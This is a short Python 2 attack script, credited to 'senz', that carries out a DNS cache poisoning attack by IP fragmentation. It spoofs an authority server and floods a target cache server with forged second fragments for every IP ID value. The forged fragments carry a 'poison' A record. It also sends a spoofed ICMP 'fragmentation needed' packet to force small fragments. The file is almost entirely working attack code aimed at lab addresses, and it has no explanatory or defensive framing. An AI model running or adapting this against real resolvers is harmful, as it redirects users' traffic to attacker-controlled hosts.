"""
This is '1st-fragment piggybacking attack' script
created by senz
"""

import socket

"""
define
"""
srcAddr = '10.0.4.5'	#target cache server
dstAddr = '10.0.3.5'	#authority server

IPid_range = [0x0000,0xffff]

#----------------
"""
function
"""
def calc_checksum(value):
	mylist = list(value)
	list2 = []
	for i in range(0,len(mylist),2):
		v = mylist[i].encode('hex')+mylist[i+1].encode('hex')
		list2.append(int(v,16))


	sum = 0
	for j in list2:
		sum+=j

	carry = (sum >> 16)

	while carry != 0:
		sum -= int(hex(carry)+'0000',16)
		sum += carry
		carry = (sum >> 16)

	sum ^= 0xffff

	ret = (((hex((sum - (sum%256))>>8)).replace('0x','')).zfill(2)).decode('hex')
	ret += (((hex(sum%256)).replace('0x','')).zfill(2)).decode('hex')

	return(ret)


def merge_list(list):
	str=''
	for s in list:
		str += s

	return str


"""
make "2nd fragment" packet
"""

srcAddr_t = srcAddr.split('.')
dstAddr_t = dstAddr.split('.')

src=''
dst=''
for i in range(0,4):
	srcAddr_t[i] = hex(int(srcAddr_t[i])).replace('0x','')
	dstAddr_t[i] = hex(int(dstAddr_t[i])).replace('0x','')
	src += (srcAddr_t[i].zfill(2)).decode('hex')
	dst += (dstAddr_t[i].zfill(2)).decode('hex')


IPheader=[]

IPheader.append('\x45')			#version and ihl
IPheader.append('\x00')			#type of service
IPheader.append('\x01\x33')		#total length
IPheader.append('\x00')			#identification(1st byte)
IPheader.append('\x00')			#identification(2nd byte)
IPheader.append('\x00')			#flags
IPheader.append('\x42')			#fragment offset(changeable)
IPheader.append('\x3f')			#ttl(64)
IPheader.append('\x11')			#protocol(udp)
IPheader.append('\x00\x00')			#header checksum
IPheader.append(dst)	#source address
IPheader.append(src)	#destination address


UDPdata=[]

UDPdata.append('\x03ns3\x05sonya\x03kmb\x00')	#Name ns3.sonya.kmb(15)
UDPdata.append('\x00\x01')			#Type A
UDPdata.append('\x00\x01')			#Class IN
UDPdata.append('\x00\x01\x51\x80')		#TTL 1day
UDPdata.append('\x00\x04')			#Data length
UDPdata.append('\x2c\x2c\x2c\x2d')		#Addr 44.44.44.44(poison)
for i in range(0,13):			#fixing the numbers(19)
	UDPdata.append('\x01a\x01a\x00\x00\x01\x00\x01\x00\x00\x00\x20\x00\x04\x02\x02\x02\x02')
UDPdata.append('\x07abcdefg\x07abcdefg\x00\x00\x01\x00\x01\x00\x00\x00\x01\x00\x04\x02\x02\x02\x02')			#fixing the numbers(31)



sock = socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_RAW)

#IP ID round robin
i_s = IPid_range[0]>>8
i_e = IPid_range[1]>>8
j_s = IPid_range[0] - i_s*0x100
j_e = IPid_range[1] - i_e*0x100

if i_s==i_e:
	i_e+=1
	if j_s==j_e:
		j_e+=1
elif j_s==j_e:
	j_e=0xff
else:
	i_e+=1
	j_e=0xff

print hex(i_s),hex(i_e),hex(j_s),hex(j_e)


for i in range(i_s,i_e):
	IPheader[3] = ((hex(i).replace('0x','')).zfill(2)).decode('hex')
	for j in range(j_s,j_e):
		IPheader[4] = ((hex(j).replace('0x','')).zfill(2)).decode('hex')
		IPheader[9]=calc_checksum(merge_list(IPheader))
		sock.sendto(merge_list(IPheader+UDPdata),(srcAddr,0))
		print 'IPID=',IPheader[3].encode('hex')+IPheader[4].encode('hex'),'send\n'

print '2nd fragment send complete'




#------------------------------



"""
make "ICMPtooBig" packet
"""

inIPheader=[]

inIPheader.append('\x45')			#version and ihl
inIPheader.append('\x00')			#type of service
inIPheader.append('\x04\x1c')			#total length
inIPheader.append('\x00\x00')			#identification
inIPheader.append('\x40\x00')			#flags and fragment offset
inIPheader.append('\x40')			#ttl(64)
inIPheader.append('\x01')			#protocol
inIPheader.append('\x00\x00')			#header checksum
inIPheader.append(dst)	#source address
inIPheader.append(src)	#destination address


inIPdata=[]

inIPdata.append('\x08')			#version and IHL
inIPdata.append('\x00')			#Type of Service
inIPdata.append('\x00\x00')		#checksum
inIPdata.append('\x09\x2e')			#Identifier(tekito-)
inIPdata.append('\x00\x01')			#Sequence number
for i in range(0,1024):
	inIPdata.append('\x11')			#data

IPdata=[]
IPdata.append('\x03')			#ICMP type
IPdata.append('\x04')			#code
IPdata.append('\x00\x00')		#checksum
IPdata.append('\x00\x00')		#unset
IPdata.append('\x02\x28')		#next hop MTU(552)

#insert checksum
inIPdata[2]=calc_checksum(merge_list(inIPdata))
inIPheader[7]=calc_checksum(merge_list(inIPheader))
IPdata[2]=calc_checksum(merge_list(IPdata+inIPheader+inIPdata))


sock2 = socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_ICMP)
r2 = sock2.sendto(merge_list(IPdata+inIPheader+inIPdata),(dstAddr,0))
print 'ICMPtooBig send(',r2,')\n'